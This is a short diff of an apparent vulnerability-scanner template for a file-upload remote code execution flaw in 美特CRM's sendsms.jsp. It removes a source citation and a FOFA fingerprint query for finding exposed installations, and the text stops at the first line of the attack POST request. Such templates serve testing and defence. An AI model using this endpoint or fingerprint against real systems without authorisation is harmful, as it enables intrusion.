@@ -3,12 +3,8 @@ info:
   name: 美特CRM sendsms.jsp 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yuax8fvwaylyzgeg'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yuax8fvwaylyzgeg
-    fofa: body="/common/scripts/basic.js"
 http:
 - raw:
   - 'POST /business/common/sms/sendsms.jsp HTTP/1.1
